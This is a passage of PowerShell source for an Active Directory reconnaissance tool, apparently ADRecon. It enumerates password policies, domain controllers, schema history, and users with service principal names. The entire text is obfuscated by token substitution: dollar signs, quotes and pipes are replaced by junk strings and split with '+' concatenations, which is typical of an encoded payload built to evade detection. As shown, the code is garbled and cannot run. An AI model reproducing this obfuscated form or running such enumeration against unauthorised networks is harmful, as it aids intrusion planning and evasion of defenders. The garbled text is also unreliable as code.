                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjwhenChangedlEzj -Value ([DateTime] bLH(bLH_.Properties.whenchanged))
                bLHADSubnetObj += bLHObj
            }
            Remove-Variable ADSubnets
        }
    }

    If (bLHADSubnetObj)
    {
        Return bLHADSubnetObj
    }
    Else
  '+'  {
        Return bLHnull
    }
}

# based on https://blogs.technet.microsoft.com/heyscriptingguy/2012/01/05/how-to-find-active-directory-schema-update-history-by-using-powershell/
Function Get-ADRSchemaHistory
{
<#
.SYNOPSIS
    Returns the Schema History of the current (or specified) domain.

.DESCRIPTION
    Returns the Schema History of the current (or specified) domain.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER objDomainRootDSE
    [DirectoryServices.DirectoryEntry]
    RootDSE Directory Entr'+'y object.

.PARAMETER DomainController
    [string]
    IP Address of the Domain Controller.

.PARAMETER Credential
    [Management.Automation.PSCredential]
    Credentials.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = bLHtrue)]
        [string] bLHMethod,

        [Parameter(Mandatory = bLHfalse)]
        [DirectoryServices.DirectoryEntry] bLHobjDomain,

        [Parameter(Mandatory = bLHfalse)]
        [DirectoryServices.DirectoryEntry] bLHobjDomainRootDSE,

        [Parameter(Mandatory = bLHfalse)]
        [string] bLHDomainController,'+'

        [Parameter(Mandatory = bLHfalse)]
        [Management.Automation.PSCredential] bLHCredential = [Management.Automation.PSCredential]::Empt'+'y
    )

    If (bLHMethod -eq xfJ4ADWSxfJ4)
    {
        Try
        {
            bLHADSchemaHistory = @( Get-ADObject -SearchBase ((Get-ADRootDSE).schemaNamingContext) '+'-SearchScope OneLevel -Filter * -Property DistinguishedName, Name, ObjectClass, whenChanged, whenCreated )
        }
        Catch
        {
            Write-Warning lEzj[Get-ADRSchemaHistory] Error while enumerating Schema ObjectslEzj
            Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
            Return bLHnull
        }

        If (bLHADSchemaHistory)
        {
            Write-Verbose lEzj[*] Total Schema Objects: bLH([ADRecon.ADWSClass]::ObjectCount(bLHADSchemaHistory))lEzj
            bLHADSchemaObj = [ADRecon.ADWSClass]::SchemaParser(bLHADSchemaHistory, bLHThreads)
            Remove-Variable ADSchemaHistory
        }
    }

    If (bLHMethod -eq xfJ4LDAPxfJ4)
    {
        If (bLHCredential -ne [Management.Automation.PSCredential]::Empty)
        {
            bLHobjSearchPath = New-Object System.DirectoryServices.DirectoryEntry lEzjLDAP://bLH(bLHDomainController)/bLH(bLHobjDomainRootDSE.schemaNamingContext)lEzj, bLHCredential.UserName,bLHCredential.GetNetworkCredential().Password
        }
        Else
        {
            bLHobjSearchPath = New-Object System.DirectoryServices.DirectoryEntry lEzjLDAP://bLH(bLHobjDomainRootDSE.schemaNamingContext)lEzj
        }
        bLHobjSearcher = New-Object System.DirectoryServices.DirectorySearcher bLHobjSearchPath
        bLHObjSearcher.Filter = lEzj(objectClass=*)lEzj
        bLHObjSearcher.PropertiesToLoad.AddRange((lEzjdistinguishednamelEzj,lEzjnamelEzj,lEzjobjectclasslEzj,lEzjwhenchangedlEzj,lEzjwhencreatedlEzj))
        bLHObjSearcher.SearchScope = lEzjOneLevellEzj

        Try
        {
            bLHADSchemaHistory = bLHObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning lEzj[Get-ADRSchemaHistory] Error while enumerating Schema ObjectslEzj
            Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
            Return bLHnull
        }
        bLHObjSearcher.dispose()

        If (bLHADSchemaHistory)
        {
            Write-Verbose lEzj[*] Total Schema Objects: bLH([ADRecon.LDAPClass]::ObjectCount(bLHADSchemaHistory))lEzj
            bLHADSchemaObj = [ADRecon.LDAPClass]::SchemaParser(bLHADSchemaHistory, bLHThreads)
            Remove-Variable ADSchemaHistory
        }
    }

    If (bLHADSchemaObj)
    {
        Return bLHADSchemaObj
    }
    Else
    {
        Return bLHnull
    }
}

Function Get-ADRDefaultPasswordPolicy
{
<#
.SYNOPSIS
    Returns the Default Password Policy of th'+'e current (or specified) domain.

.DESCRIPTION
    Returns the Default Password Policy of the current (or specified) domain.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = bLHtrue)]
        [string] bLHMethod,

        [Parameter(Mandatory = bLHfalse)]
        [DirectoryServices.DirectoryEntry] bLHobjDomain
    )

    If (bLHMethod -eq xfJ4ADWSxfJ4)
    {
        Try
        {
            bLHADpasspolicy = Get-ADDefaultDomainPasswordPolicy
        }
        Catch
        {
            Write-Warning lEzj[Get-ADRDefaultPasswordPolicy] Error while enumerating the Default Password PolicylEzj
            Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
            Return bLHnull
        }

        If (bLHADpasspolicy)
        {
            bLHObjValues = @( lEzjEnforce password history (passwords)lEzj, bLHADpasspolicy.PasswordHistoryCount, lEzj4lEzj, lEzjReq. 8.2.5lEzj, lEzj8lEzj, lEzjControl: 0423lEzj, lEzj24 or morelEzj,
            lEzjMaximum password age (days)lEzj, bLHADpasspolicy.MaxPasswordAge.days, lEzj90lEzj, lEzjReq. 8'+'.2.4lEzj, lEzj90lEzj, lEzjControl: 0423lEzj, lEzj1 to 60lEzj,
            lEzjMinimum password age (days)lEzj, bLHADpasspolicy.MinPasswordAge.days, lEzjN/AlEzj, lEzj-lEzj, lEzj1lEzj, lEzjControl: 0423lEzj, lEzj1 or morelEzj,
            lEzjMinimum password length (characters)lEzj, bLHADpasspolicy.MinPasswordLength, lEzj7lEzj, lEzjReq. 8.2.3lEzj, lEzj13lEzj, lEzjControl: 0421lEzj, lEzj14 or morelEzj,
            lEzjPassword must meet complexity requirementslEzj, bLHADpasspolicy.ComplexityEnabled, bLHtrue, lEzjReq. 8.2.3lEzj, bLHtrue, lEzjControl: 0421lEzj, bLHtrue,
            lEzjStore password using reversible encryption for all users in the domainlEzj, bLHADpasspolicy.ReversibleEncryptionEnabled, lEzjN/AlEzj, lEzj-lEzj, lEzjN/AlEzj, lEzj-lEzj, bLHfalse,
            lEzjAccount lockout duration (mins)lEzj, bLHADpasspolicy.LockoutDuration.minutes, lEzj0 (manual unlock) or 30lEzj, lEzjReq. 8.1.7lEzj, lEzjN/AlEzj, lEzj-lEzj, lEzj15 or morelEzj,
            lEzjAccount lockout threshold (attempts)lEzj, bLHADpasspolicy.LockoutThreshold, lEzj1 to 6lEzj, lEzjReq. 8.1.6lEzj, lEzj1 to 5lEzj, lEzjControl: 1403lEzj, lEzj1 to 10lEzj,
            lEzjReset account lockout counter after (mins)lEzj, bLHADpasspolicy.LockoutObservationWindow.minutes, lEzjN/AlEzj, lEzj-lEzj, lEzjN/AlEzj, lEzj-lEzj, lEzj15 or morelEzj )

            Remove-Variable ADpasspolicy
        }
    }

    If (bLHMethod -eq xfJ4LDAPxfJ4)
    {
        If (bLHObjDomain)
        {
            #Value taken from https://msdn.microsoft.com/en-us/library/ms679431(v=vs.85).aspx
            bLHpwdProperties = @{
                lEzjDOMAIN_PASSWORD_COMPLEXlEzj = 1;
                lEzjDOMAIN_PASSWORD_NO_ANON_CHANGElEzj = 2;
                lEzjDOMAIN_PASSWORD_NO_CLEAR_CHANGElEzj = 4;
                lEzjDOMAIN_LOCKOUT_ADMINSlEzj = 8;
                lEzjDOMAIN_PASSWORD_STORE_CLEARTEXTlEzj = 16;
                lEzjDOMAIN_REFUSE_PASSWORD_CHANGElEzj = 32
            }

            If ((bLHObjDomain.pwdproperties.value -band bLHpwdProperties[lEzjDOMAIN_PASSWORD_COMPLEXlEzj]) -eq bLHpwdProperties[lEzjDOMAIN_PASSWORD_COMPLEXlEzj])
            {
                bLHComplexPasswords = bLHtrue
            }
            Else
            {
                bLHComplexPasswords = bLHfalse
            }

            If ((bLHObjDomain.pwdproperties.value -band bLHpwdProperties[lEzjDOMAIN_PASSWORD_STORE_CLEARTEXTlEzj]) -eq bLHpwdProperties[lEzjDOMAIN_PASSWORD_STORE_CLEARTEXTlEzj])
            {
                bLHReversibleEncryption = bLHtrue
            }
            Else
            {
                bLHReversibleEncryption = bLHfalse
            }

            bLHLockoutDuration = bLH(bLHObjDomain.ConvertLargeIntegerToInt64(bLHObjDomain.lockoutduration.value)/-600000000)

            If (bLHLockoutDuration -gt 99999)
            {
                bLHLockoutDuration = 0
            }

            bLHObjValues = @( lEzjEnforce password history (passwords)lEzj, bLHObjDomain.PwdHistoryLength.value, lEzj4lEzj, lEzjReq. 8.2.5lEzj, lEzj8lEzj, lEzjControl: 0423lEzj, lEzj24 or morelEzj,'+'
            lEzjMaximum password age (days)lEzj, bLH(bLHObjDomain.ConvertLargeIntegerToInt64(bLHObjDomain.maxpwdage.value) /-864000000000), lEzj90lEzj, lEzjReq. 8.2.4lEzj, lEzj90lEzj, lEzjControl: 0423lEzj, lEzj1 to 60lEzj,
            lEzjMinimum password age (days)lEzj, bLH(bLHObjDomain.ConvertLargeIntegerToInt64(bLHObjDomain.minpwdage.value) /-864000000000), lEzjN/AlEzj, lEzj-lEzj, lEzj1lEzj, lEzjControl: 0423lEzj, lEzj1 or morelEzj,
            lEzjMinimum password length (characters)lEzj, bL'+'HObjDomain.MinPwdLength.value, lEzj7lEzj, lEzjReq. 8.2.3'+'lEzj, lEzj13lEzj, lEzjControl: 0421lEzj, lEzj14 or morelEzj,
            lEzjPassword must meet complexity requirementslEzj, bLHComplexPasswords, bLHtrue, lEzjReq. 8.2.3lEzj, bLHtrue, lEzjControl: 0421lEzj, bLHtrue,
            lEzjStore password using reversible encryption for all users in the domainlEzj, bLHReversibleEncryption, lEzjN/AlEzj, lEzj-lEzj, lEzjN/AlEzj, lEzj-lEzj, bLHfalse,
      '+'      lEzjAccount lockout duration (mins)lEzj, bLHLockoutDuration, lEzj0 (manual unlock) or 30lEzj, lEzjReq. 8.1.7lEzj, lEzjN/AlEzj, lEzj-lEzj, lEzj15 or morelEzj,
            lEzjAccount lockout threshold (attempts)lEzj, bLHObjDomain.LockoutThreshold.value, lEzj1 to 6lEzj, lEzjReq. 8.1.6lEzj, lEzj1 to 5lEzj, lEzjControl: 1403lEzj, lEzj1 to 10lEzj,
            lEzjReset account lockout counter after (mins)lEzj, bLH(bLHObjDomain.ConvertLargeIntegerToInt64(bLHObjDomain.lockoutobservationWindow.value)/-600000000), lEzjN/AlEzj, lEzj-lEzj, lEzjN/AlEzj, lEzj-lEzj, lEzj15 or morelEzj )

            Remove-Variable pwdProperties
            Remove-Variable ComplexPasswords
            Remove-Variable ReversibleEncryption
        }
    }

    If (bLHObjValues)
    {
        bLHADPassPolObj = @()
        For (bLHi = 0; bLHi -lt bLH(bLHObjValues.Count); bLHi++)
        {
            bLHObj = New-Object PSObject
            bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjPolicylEzj -Value bLHObjValues[bLHi]
            bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjCurrent ValuelEzj -Value bLHObjValues[bLHi+1]
            bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjPCI DSS RequirementlEzj -Value bLHObjValues[bLHi+2]
            bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjPCI DSS v3.2.1lEzj -Value bLHObjValues[bLHi+3]
            bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjASD ISMlEzj -Value bLHObjValues[bLHi+4]
            bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzj2018 ISM ControlslEzj -Value bLHObjValues[bLHi+5]
            bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjCIS Benchmark 2016lEzj -Value bLHObjValues[bLHi+6]
            bLHi += 6
            bLHADPassPolObj += bLHObj
        }
        Remove-Variable ObjValues
        Return bLHADPassPolObj
    }
    Else
    {
        Return bLHnull
    }
}

Function Get-ADRFineGrainedPasswordPolicy
{
<#
.SYNOPSIS
    Returns the Fine Grained Password Policy of the current (or specified) domain.

.DESCRIPTION
    Returns the Fine Grained Password Policy of the current (or specified) domain.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = bLHtrue)]
        [string] bLHMethod,

        [Parameter(Mandatory = bLHfalse)]
        [DirectoryServices.DirectoryEntry] bLHobjDomain
    )

    If (bLHMethod -eq xfJ4ADWSxfJ4)
    {
        Try
        {
            bLHADFinepasspolicy = Get-ADFineGrainedPasswordPolicy -Filter *
        }
        Catch
        {
            Write-Warning lEzj[Get-ADRFineGrainedPasswordPolicy] Error while enumerating the Fine Grained Password PolicylEzj
            Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
            Return bLHnull
        }

        If (bLHADFinepasspolicy)
        {
            bLHADPassPolObj = @()

            bLHADFinepasspolicy 0Ogv ForEach-Object {
                For(bLHi=0; bLHi -lt bLH(bLH_.AppliesTo.Count); bLHi++)
                {
                    bLHAppliesTo = bLHAppliesTo + lEzj,lEzj + bLH_.AppliesTo[bLHi]
                }
                If (bLHnull -ne bLHAppliesTo)
                {
                    bLHAppliesTo = bLHAppliesTo.TrimStart(lEzj,lEzj)
                }
                bLHObjValues = @(lEzjNamelEzj, bLH(bLH_.Name),'+' lEzjApplies TolEzj, bLHAppliesTo, lEzjEnforce password historylEzj, bL'+'H_.PasswordHistoryCount, lEzjMaximum password age (days)lEzj, bLH_.MaxPasswordAge.days, lEzjMinimum password age (days)lEzj, bLH_.MinPasswordAge.days, lEzjMinimum password lengthlEzj, bLH_.MinPasswordLength, lEzjPassword must meet complexity requirementslEzj, bLH_.ComplexityEnabled, lEzjStore password using reversible encryptionlEzj, bLH_.ReversibleEncryptionEnabled, lEzjAccount lockout duration (mins)lEzj, bLH_.LockoutDuration.minutes, lEzjAccount lockout thresholdlEzj, bLH_.LockoutThreshold, lEzjReset account lockout counter after (mins)lEzj, bLH_.LockoutObservationWindow.minutes, lEzjPrecedencelEzj, bLH(bLH_.Precedence))
                For (bLHi = 0; bLHi -lt bLH(bLHObjValues.Count); bLHi++)
                {
                    bLHObj = New-Object PSObject
                    bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjPolicylEzj -Value bLHObjValues[bLHi]
                    bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjValuelEzj -Value bLHObjValues[bLHi+1]
                    bLHi++
                    bLHADPassPolObj += bLHObj
                }
            }
            Remove-Variable ADFinepasspolicy
        }
    }

    If (bLHMethod -eq xfJ4LDAPxfJ4)
    {
        If (bLHObjDomain)
        {
            bLHobjSearcher = New-Object System.DirectoryServices.DirectorySearcher bLHobjDomain
            bLHObjSearcher.PageSize = bLHPageSize
            bLHObjSearcher.Filter = lEzj(objectClass=msDS-PasswordSettings)lEzj
            bLHObjSearcher.SearchScope = lEzjSubtreelEzj
            Try
  '+'          {
                bLHADFinepasspolicy = bLHObjSearcher.FindAll()
    '+'        }
            Catch
            {
                Write-Warning lEzj[Get-ADRFineGrainedPasswordPolicy] Error while enumerating the Fine Grained Password PolicylEzj
                Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
                Return bLHnull
            }

            If (bLHADFinepasspolicy)
            {
                If ([ADRecon.LDAPClass]::ObjectCoun'+'t(bLHADFinepasspolicy) -ge 1)
                {
                    bLHADPassPolObj = @()
                    bLHADFinepasspolicy 0Ogv ForEach-Object {
                    For(bLHi=0; bLHi -lt bLH(bLH_.Properties.xfJ4msds-psoappliestoxfJ4.Count); bLHi++)
                    {
                        bLHAppliesTo = bLHAppliesTo + lEzj,lEzj + bLH_.Properties.xf'+'J4msds-psoappliestoxfJ4[bLHi]
                    }
                    If (bLHnull -ne bLHAppliesTo)
                    {
                        bLHAppliesTo = bLHAppliesTo.TrimStart(lEzj,lEzj)
                    }
                        bLHObjValu'+'es = @(lEzjNamelEzj, bLH(bLH_.Properties.name), lEzjApplies TolEzj, bLHAppliesTo, lEzjEnforce password historylEzj, bLH(bLH_.Properties.xfJ4msds-passwordhistorylengthxfJ4), lEzjMaximum password age (days)lEzj, bLH(bLH(bLH_.Properties.xfJ4msds-maximumpasswordagexfJ4) /-864000000000), lEzjMinimum password age (days)lEzj, bLH(bLH(bLH_.Properties.xfJ4msds-minimumpasswordagexfJ4) /-864000000000), lEzjMinimum password lengthlEzj, bLH(bLH_.Properties.xfJ4msds-minimumpasswordlengthxfJ4), lEzjPassword must meet complexity requirementslEzj, bLH(bLH_.Properties.xfJ4msds-passwordcomplexityenabledxfJ4), lEzjStore password using reversible encryptionlEzj, bLH(bLH_.Properties.xfJ4msds-passwordreversibleencryptionenabledxfJ4), lEzjAccount lockout duration (mins)lEzj, bLH(bLH(bLH_.Properties.xfJ4msds-lockoutdurationxfJ4)/-600000000), lEzjAccount lockout thresholdlEzj, bLH(bLH_.Properties.xfJ4msds-lockoutthresholdxfJ4), lEzjReset account lockout counter after (mins)lEzj, bLH(bLH(bLH_.Properties.xfJ4msds-lockoutobservationwindowxfJ4)/-600000000), lEzjPrecedencelEzj, bLH(bLH_.Properties.xfJ4msds-passwordsettingsprecedencexfJ4))
                        For (bLHi = 0; bLHi -lt bLH(bLHObjValues.Count); bLHi++)
                        {
                            bLHObj = New-Object PSObject
                            bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjPolicylEzj -Value bLHObjValues[bLHi]
                            bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjValuelEzj -Value bLHObjValues[bLHi+1]
                            bLHi++
                            bLHADPassPolObj += bLHObj
                        }
                    }
                }
                Remove-Variable ADFinepasspolicy
            }
        }
    }

    If (bLHADPassPolObj)
    {
        Return bLHADPassPolObj
    }
    Else
    {
        Return bLHnull
    }
}

Function Get-ADRDomainController
{
<#
.SYNOPSIS
  '+'  Returns the domain controllers for the current (or specified) forest.

.DESCRIPTION
    Returns the domain controllers for the current (or specified) forest.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDA'+'P.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER Credential
    [Management.Automation.PSCredential]
    Credentials.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = bLHtrue)]
        [string] bLHMethod,

        [Parameter(Mandatory = bLHfalse)]
        [DirectoryServices.DirectoryEntry] bLHobjDomain,

        [Parameter(Mandatory = bLHfalse)]
        [Management.Automation.PSCredential] bLHCredential = [Management.Automation.PSCredential]::Empty
    )

    If (bLHMethod -eq xfJ4ADWSxfJ4)
    {
        Try
        {
            bLHADDomainControllers = @( Get-ADDomainController -Filter * )
        }
        Catch
        {
            Write-Warning lEzj[Get-ADRDomainController] Error while enumerating DomainController ObjectslEzj
            Write-Verbose lEzj[EXCEPT'+'ION] bLH(bLH_.Exception.Message)lEzj
            Return bLHnull
        }

        # DC Info
        If (bLHADDomainControllers)
        {'+'
            Write-Verbose lEzj[*] Total Domain Controllers: bLH([ADRecon.ADWSClass]::ObjectCount(bLHADDomainControllers))lEzj
            bLHDCObj = [ADRecon.ADWSClass]::DomainControllerParser(bLHADDomainControllers, bLHThreads)
            Remove-Variable ADDomainControllers
        }
    }

    If (bLHMethod -eq xfJ4LDAPxfJ4)
    {
        If (bLHCredential -ne [Management.Automation.PSCredential]::Empty)
        {
            bLHDomainFQDN = Get-DNtoFQDN(bLHobjDomain.distinguishedName)
            bLHDomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(lEzjDomainlEzj,bLH(bLHDomainFQDN),bLH(bLHCredential.UserName),bLH(bLHCredential.GetNetworkCredential().password))
            Try
            {
                bLHADDomain = [System.DirectoryServices.ActiveDirectory.Domain]::G'+'etDomain(bLHDomainContext)
            }
            Catch
            {
                Write-Warning lEzj[Get-ADRDomainController] Error getting Domain ContextlEzj
                Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
                Return bLHnull
            }
            Remove-Variable DomainContext
        }
        Else
        {
            bLHADDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
        }

        If (bLHADDomain.DomainControllers)
        {
            Write-Verbose lEzj[*] Total Domain Controllers: bLH([ADRecon.LDAPClass]::ObjectCount(bLHADDomain.DomainControllers))lEzj
            bLHDCObj = [ADRecon.LDAPClass]::DomainControllerParser(bLHADDomain.DomainControllers, bLHThreads)
            Remove-Variable ADDomain
        }
    }

    If (bLHDCObj)
    {
        Return bLHDCObj
    }
    Else
    {
        Return bLHnull
    }
}

Function Get-ADRUser
{
<#
.SYNOPSIS
    Returns all use'+'rs and/or service principal name (SPN) in the current (or specified) domain.

.DESCRIPTION
    Returns all users and/or  service principal name (SPN) in the current (or specified) domain.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER date
    [DateTime]
    Date when ADRecon was executed.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER DormantTimeSpan
    [int]
    Timespan for Dormant accounts. Default 90 days.

.PARAMETER PageSize
    [int]
    The PageSize to set for the LDAP searcher object. Default 200.

.PARAMETER Threads
    [int]
    The number of threads to use during processing of objects. Default 10.

.PARAMETER ADRUsers
    [bool]

.PARAMETER ADRUserSPNs
    [bool]

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = bLHtrue)]
        [string] bLHMethod,

        [Parameter(Mandatory = bLHtrue)]
        [DateTime] bLHdate,

        [Parameter(Mandatory = bLHfalse)]
        [DirectoryServices.DirectoryEntry] bLHobjDomain,

        [Parameter(Mandatory = bLHtrue)]
        [int] bLHDormantTimeSpan = 90,

        [Parameter(Mandatory = bLHtrue)]
        [int] bLHPageSize,

        [Parameter(Mandatory = bLHfalse)]
        [int] bLHThreads = 10,

        [Parameter(Mandatory = bLHfalse)]
        [int] bLHADRUsers = bLHtrue,

        [Parameter(Mandatory = bLHfalse)]
        [int] bLHADRUserSPNs = bLHfalse
    )

    If (bLHMethod -eq xfJ4ADWSxfJ4)
    {
        If (!bLHADRUsers)
        {
            Try
            {
                bLHADUsers = @( Get-ADObject -LDAPFilter lEzj(&(samAccountType=805306368)(servicePrincipalName=*))lEzj -ResultPageSize bLHPageSize -Properties Name,Description,memberOf,sAMAccountName,servicePrincipalName,primaryGroupID,pwdLastSet,userAccountControl )
            }
            Catch
            {
                Write-Warning lEzj[Get-ADRUser] Error while enumerating UserSPN ObjectslEzj
                Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
                Return bLHnull
            }
        }
        Else
        {
            Try
            {
                bLHADUsers = @( Get-ADUser -Filter * -ResultPageSize bLHPageSize -Properties AccountExpirationDate,accountExpires,AccountNotDelegated,AdminCount,AllowReversiblePasswordEncryption,c,CannotChangePassword,CanonicalName,Company,Department,Description,DistinguishedName,DoesNotRequirePreAuth,Enabled,givenName,homeDirector'+'y,Info,LastLogonDate,lastLogonTimestamp,LockedOut,LogonWorkstations,mail,Manager,memberOf,middleName,mobile,xfJ4msDS-AllowedToDelegateToxfJ4,xfJ4msDS-SupportedEncryptionTypesxfJ4,Name,PasswordExpired,PasswordLastSet,PasswordNeverExpires,PasswordNotRequired,primaryGroupID,profilePath,pwdlastset,SamAccountName,ScriptPath,servicePrincipalName,SID,SIDHistory,SmartcardLogonRequired,sn,Title,TrustedForDelegation,TrustedToAuthForDelegation,UseDESKeyOnly,UserAccountControl,whenChanged,whenCreated )
            }
            Catch
            {
                Write-Warning lEzj[Get-ADRUser] Error while enumerating User ObjectslEzj
                Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
                Return bLHnull
            }
        }
        If (bLHADUsers)
        {
            Write-Verbose lEzj[*] Total Users: bLH([ADRecon.ADWSClass]::ObjectCount(bLHADUsers))lEzj
            If (bLHADRUsers)
            {
                Try
                {
                    bLHADpasspolicy = Get-ADDefaultDomainPasswordPolicy
                    bLHPassMaxAge = bLHADpasspolicy.MaxPasswordAge.days
                    Remove-Variable ADpasspolicy
                }
                Catch
                {
                    Write-Warning lEzj[Get-ADRUser] Error retrieving Max Password Age from the Default Password Policy. Using value as 90 dayslEzj
                    Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
                    bLHPassMaxAge = 90
                }
                bLHUserObj = [ADRecon.ADWSClass]::UserParser(bLHADUsers, bLHdate, bLHDormantTimeSpan, bLHPassMaxAge, bLHThreads)
            }
            If (bLHADRUserSPNs)
            {
                bLHUserSPNObj = [ADRecon.ADWSClass]::UserSPNParser(bLHADUsers, bLHThreads)
            }
            Remove-Variable ADUsers
        }
    }

    If (bLHMethod -eq xfJ4LDAPxfJ4)
    {
        If (!bLHADRUsers)
        {
            bLHobjSearcher = New-Object System.DirectoryServices.DirectorySearcher bLHobjDomain
            bLHObjSearcher.PageSize = bLHPageSize
            bLHObjSe'+'archer.Filter = lEzj(&(samAccountType=805306368)(servicePrincipalName=*))lEzj
            bLHObjSearcher.PropertiesToLoad.AddRange((lEzjnamelEzj,lEzjdescriptionlEzj,lEzjmemberoflEzj,lEzjsamaccountnamelEzj,lEzjserviceprincipalnamelEzj,lEzjprimarygroupidlEzj,lEzjpwdlastsetlEzj,lEzjuseraccountcontrollEzj))
            bLHObjSearcher.SearchScope = lEzjSubtreelEzj
            Try
            {
                bLHADUsers = bLHObjSearcher.FindAll()
            }
            Catch
            {
                Write-Warning lEzj[Get-ADRUser] Error while enumerating UserSPN ObjectslEzj
                Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
                Return bLHnull
            }
            bLHObjSearcher.dispose()
        }
        Else
        {
            bLHobjSearcher = New-Object System.DirectoryServices.DirectorySearcher bLHobjDomain
            bLHObjSearcher.PageSize = bLHPageSize
            bLHObjSearcher.Filter = lEzj(samAccountType=805306368)lEzj
            # https://msdn.microsoft.com/en-us/library/system.directoryservices.securitymasks(v=vs.110).aspx
            bLHObjSearcher.SecurityMasks = [System.DirectoryServices.SecurityMasks]xfJ4DaclxfJ4
            bLHObjSearcher.PropertiesToLoad.AddRange((lEzjaccountExpireslEzj,lEzjadmincountlEzj,lEzjclEzj,lEzjcanonicalnamelEzj,lEzjcompanylEzj,lEzjdepartmentlEzj,lEzjdescriptionlEzj,lEzjdistinguishednamelEzj,lEzjgivenNamelEzj,lEzjhomedirectorylEzj,lEzjinfolEzj,lEzjlastLogontimestamplEzj,lEzjmaillEzj,lEzjmanagerlEzj,lEzjmemberoflEzj,lEzjmiddleNamelEzj,lEzjmobilelEzj,lEzjmsDS-AllowedToDelegateTolEzj,lEzjmsDS-SupportedEncryptionTypeslEzj,lEzjnamelEzj,lEzjntsecuritydescriptorlEzj,lEzjobjectsidlEzj,lEzjprimarygroupidlEzj,lEzjprofilepathlEzj,lEzjpwdLastSetlEzj,lEzjsamaccountNamelEzj,lEzjscriptpathlEzj,lEzjserviceprincipalnamelEzj,lEzjsidhistorylEzj,lEzjsnlEzj,lEzjtitlelEzj,lEzjuseraccountcontrollEzj,lEzjuserworkstationslEzj,lEzjwhenchangedlEzj,lEzjwhencreatedlEzj))
            bLHObjSearcher.SearchScope = lEzjSubtreelEzj
            Try
            {
                bLHADUsers = bLHObjSearcher.FindAll()
            }
            Catch
            {
                Write-Warning lEzj[Get-ADRUser] Error while enumerating User ObjectslEzj
                Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
                Return bLHnull
            }
            bLHObjSearcher.dispose()
        }
        If (bLHADUsers)
        {
            Write-Verbose lEzj[*] Total Users: bLH([ADRecon.LDAPClass]::ObjectCount(bLHADUsers))lEzj
            If (bLHADRUsers)
            {
                bLHPassM'+'axAge = bLH(bLHObjDomain.ConvertLargeIntegerToInt64(bLHObjDomain.maxpwdage.value) /-864000000000)
                If (-Not bLHPassMaxAge)
                {
                    Write-Warning lEzj[Get-ADRUser] Error retrieving Max Password Age from the Default Password Policy. Using value as 90 dayslEzj
                    Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
                    bLHPassMaxAge = 90
                }
                bLHUserObj = [ADRecon.LDAPClass]::UserParser(bLHADUsers, bLHdate, bLHDormantTimeSpan, bLHPassMaxAge, bLHThreads)
            }
            If '+'(bLHADRUserSPNs)
            {
                bLHUserSPNObj = [ADRecon.LDAPClass]::UserSPNParser(bLHADUsers, bLHThreads)
            }
            Remove-Variable ADUsers
        }
    }

    If (bLHUserObj)
    {
        Export-ADR -ADRObj bLHUserObj -ADROutputDir bLHADROutputDir -OutputType bLHOutputType -ADRModuleName lEzjUserslEzj
        Remove-Variable UserObj
    }
    If (bLHUserSPNObj)
    {
        Export-ADR -ADRObj bLHUserSPNObj -ADROutputDir bLHADROutputDir -OutputType bLHOutputType -ADRModuleName lEzjUserSPNslEzj
        Remove-V'+'ariable UserSPNObj
    }
}

#TODO
Function Get-ADRPasswordAttributes
{
<#
.SYNOPSIS
  '+'  Returns all objects with plaintext passwords in the current (or specified) domain.

.DESCRIPTION
    Returns all objects with plaintext passwords in the current (or specified) domain.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER PageSize
    [int]
    The PageSize to set for the LDAP searcher object. Default 200.

.OUTPUTS
    PSObject.

.LINK
    https://www.ibm.com/support/knowledgecenter/en/ssw_aix_71/com.ibm.aix.security/ad_password_attribute_selection.htm
